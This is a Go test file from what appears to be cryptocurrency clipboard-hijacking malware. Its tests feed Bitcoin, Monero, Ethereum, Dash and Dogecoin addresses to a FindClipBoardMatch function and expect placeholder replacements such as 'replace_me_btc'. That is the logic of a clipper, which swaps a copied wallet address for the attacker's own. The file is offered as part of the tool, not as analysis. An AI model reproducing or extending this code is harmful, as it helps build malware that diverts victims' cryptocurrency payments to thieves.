package address

import (
	"log"
	"testing"

	"github.com/stretchr/testify/assert"
)

var (
	// random addresses found from explorers,etc
	XMR_ADDRESSES_TO_TEST = []string{"4AdUndXHHZ6cfufTMvppY6JwXNouMBzSkbLYfpAV5Usx3skxNgYeYTRj5UzqtReoS44qo9mtmXCqY45DJ852K5Jv2684Rge"}
	BTC_ADDRESSES_TO_TEST = []string{
		"bc1qp3f7vnmuj4pjxpfvkvf7yznac9h9r5arlv4fpv",
		"bc1qp5wcfjqy3wnt2cuwduglxuxsdna2pf8jwt6l3t",
		"bc1qwzn9lejwy7y0lpmrgk06xrhle0yn3et29xhr24"}
	ETH_ADDRESSES_TO_TEST = []string{
		"0x71C7656EC7ab88b098defB751B7401B5f6d8976F",
		"0x9261b6239a85348e066867c366d3942648e24511",
		"0x7f0b1948d6bd8162b5d0b85cf934c56ce6b7770b"}
	// https://chainz.cryptoid.info/dash/
	DASH_ADDRESSES_TO_TEST = []string{
		"XpESxaUmonkq8RaLLp46Brx2K39ggQe226",
		"Xi82Z55qQbc5GSj3q6vrTtFrEzRq22WGGi",
		"Xh2Y4gQcE9E27GFmUjw2nCeRabpTdvCMAJ"}
	// https://blockchair.com/dogecoin
	DOGE_ADDRESSES_TO_TEST = []string{
		"DMuFDCTwxdqzfWrCEE7HiMxBonKVU49Fz4",
		"D5LLkAy7aLfr4Fx8D3EuidfrziqqkjTxNq",
		"DDSw5f34P8w56P45pjisLR27c2dgu7NcQc"}
)

func TestBitcoinMatch(t *testing.T) {
	for _, address := range BTC_ADDRESSES_TO_TEST {
		var expected string = "replace_me_btc"

		log.Printf("testing address: %s, expecting:%s", address, expected)
		actual, err := FindClipBoardMatch(address)
		assert.Equal(t, expected, actual)
		assert.Equal(t, err, nil)
	}
}

func TestMoneroMatch(t *testing.T) {
	for _, address := range XMR_ADDRESSES_TO_TEST {
		var expected string = "replace_me_xmr"

		log.Printf("testing address: %s, expecting:%s", address, expected)
		actual, err := FindClipBoardMatch(address)
		assert.Equal(t, expected, actual)
		assert.Equal(t, err, nil)
	}
}

func TestEthereumMatch(t *testing.T) {
	for _, address := range ETH_ADDRESSES_TO_TEST {
		var expected string = "replace_me_eth"

		log.Printf("testing address: %s, expecting:%s", address, expected)
		actual, err := FindClipBoardMatch(address)
		assert.Equal(t, expected, actual)
		assert.Equal(t, err, nil)
	}
}

func TestDashMatch(t *testing.T) {
	for _, address := range DASH_ADDRESSES_TO_TEST {
		var expected string = "replace_me_dash"

		log.Printf("testing address: %s, expecting:%s", address, expected)
		actual, err := FindClipBoardMatch(address)
		assert.Equal(t, expected, actual)
		assert.Equal(t, err, nil)
	}
}

func TestDogeMatch(t *testing.T) {
	for _, address := range DOGE_ADDRESSES_TO_TEST {
		var expected string = "replace_me_doge"

		log.Printf("testing address: %s, expecting:%s", address, expected)
		actual, err := FindClipBoardMatch(address)
		assert.Equal(t, expected, actual)
		assert.Equal(t, err, nil)
	}
}
